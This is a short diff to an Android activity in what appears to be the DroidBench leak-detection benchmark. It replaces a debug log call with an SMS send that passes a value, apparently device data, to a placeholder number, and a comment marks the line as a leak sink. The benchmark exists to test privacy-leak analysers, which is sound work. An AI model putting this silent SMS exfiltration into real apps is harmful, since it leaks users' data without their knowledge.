@@ -4,8 +4,8 @@ import android.app.Activity;
 import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.view.Menu;
 
 /**
@@ -37,7 +37,8 @@ public class MainActivity extends Activity {
 
 		@Override
 		protected String doInBackground(String... params) {
-			Log.d("DroidBench", params[0]);
+			SmsManager sms = SmsManager.getDefault();
+			sms.sendTextMessage("+49 1234", null, params[0], null, null); //sink, leak
 			return "Done";
 		}
 		
